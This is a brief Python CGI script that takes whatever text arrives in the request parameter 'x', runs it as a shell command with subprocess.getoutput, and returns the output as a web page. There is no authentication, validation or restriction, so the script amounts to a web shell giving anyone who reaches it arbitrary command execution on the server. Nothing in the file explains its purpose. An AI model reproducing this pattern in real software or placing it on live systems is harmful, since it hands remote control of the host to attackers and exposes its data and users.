#!/usr/bin/python3

import subprocess
import cgi
import time


print("content-type: text/html")
print()

f=cgi.FieldStorage()
cmd=f.getvalue("x")

o=subprocess.getoutput(cmd)
print(o)

